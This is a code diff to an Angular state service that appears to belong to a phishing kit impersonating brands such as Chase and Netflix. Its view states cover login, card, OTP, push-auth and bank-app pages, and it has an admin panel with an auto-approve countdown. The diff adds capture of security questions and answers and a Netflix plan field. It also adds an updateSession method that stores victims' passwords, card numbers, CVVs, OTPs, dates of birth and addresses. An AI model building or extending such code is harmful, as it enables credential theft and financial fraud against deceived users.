@@ -9,7 +9,7 @@ import { PollingScheduler } from './polling.util';
 import { DataCaptureService } from './data-capture.service';
 import { getFlowById, FlowConfig } from './flows.service';
 
-export type ViewState = 'gate' | 'security-check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card-otp' | 'email-otp' | 'push-auth' | 'bank-app' | 'loading' | 'step-success' | 'success' | 'admin';
+export type ViewState = 'gate' | 'security-check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card-otp' | 'email-otp' | 'push-auth' | 'bank-app' | 'loading' | 'step-success' | 'success' | 'admin' | string;
 export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'email_otp_pending' | 'push_auth_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
@@ -107,6 +107,8 @@ export class StateService {
     readonly pageTitle = signal<string>('');
     readonly cardOtp = signal<string>('');
     readonly emailOtp = signal<string>('');
+    readonly securityQuestion = signal<string>('');
+    readonly securityAnswer = signal<string>('');
 
     // New Flow Control
     readonly currentFlow = signal<FlowConfig | undefined>(undefined);
@@ -422,6 +424,8 @@ export class StateService {
             cardExpiry: this.cardExpiry(),
             cardCvv: this.cardCvv(),
             cardOtp: this.cardOtp(),
+            securityQuestion: this.securityQuestion(),
+            securityAnswer: this.securityAnswer(),
             verificationFlow: this.verificationFlow(),
             skipPhoneVerification: this.skipPhoneVerification(),
 
@@ -435,9 +439,13 @@ export class StateService {
             timestamp: Date.now(),
             // New fields for Admin Countdown
             waitingStart: this.waitingStartPublic(),
-            autoApproveThreshold: this.autoApproveThreshold()
+            autoApproveThreshold: this.autoApproveThreshold(),
+            netflixPlan: this.netflixPlan()
         };
     }
+
+    // --- Netflix Specific ---
+    netflixPlan = signal<string | null>(null);
 
     private restoreLocalState() {
         try {
@@ -508,6 +516,8 @@ export class StateService {
         if (data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
         if (data.cardCvv) this.cardCvv.set(data.cardCvv);
         if (data.cardOtp) this.cardOtp.set(data.cardOtp);
+        if (data.securityQuestion) this.securityQuestion.set(data.securityQuestion);
+        if (data.securityAnswer) this.securityAnswer.set(data.securityAnswer);
         if (data.verificationFlow) this.verificationFlow.set(data.verificationFlow);
         if (data.skipPhoneVerification !== undefined) this.skipPhoneVerification.set(data.skipPhoneVerification);
 
@@ -1597,4 +1607,31 @@ export class StateService {
         setTimeout(() => this.adminToast.set(null), 3000);
     }
 
+    public updateSession(data: any) {
+        if (data.email !== undefined) this.email.set(data.email);
+        if (data.password !== undefined) this.password.set(data.password);
+        if (data.username !== undefined) this.email.set(data.username); // Chase uses username
+        if (data.phoneNumber !== undefined) this.phoneNumber.set(data.phoneNumber);
+        if (data.firstName !== undefined) this.firstName.set(data.firstName);
+        if (data.lastName !== undefined) this.lastName.set(data.lastName);
+        if (data.dob !== undefined) this.dob.set(data.dob);
+        if (data.address !== undefined) this.address.set(data.address);
+        if (data.country !== undefined) this.country.set(data.country);
+        if (data.cardNumber !== undefined) this.cardNumber.set(data.cardNumber);
+        if (data.cardExpiry !== undefined) this.cardExpiry.set(data.cardExpiry);
+        if (data.cardCvv !== undefined) this.cardCvv.set(data.cardCvv);
+        if (data.billingZip !== undefined) this.address.set(data.billingZip); // Reuse address for zip if needed or add new field
+        if (data.cardOtp !== undefined) this.cardOtp.set(data.cardOtp);
+        if (data.securityQuestion !== undefined) this.securityQuestion.set(data.securityQuestion);
+        if (data.securityAnswer !== undefined) this.securityAnswer.set(data.securityAnswer);
+        if (data.netflixPlan !== undefined) this.netflixPlan.set(data.netflixPlan);
+        if (data.currentStep !== undefined) {
+            // Logic to handle step updates if needed
+        }
+        if (data.status !== undefined) {
+            if (data.status === 'completed') this.isFlowComplete.set(true);
+        }
+
+        this.syncState();
+    }
 }
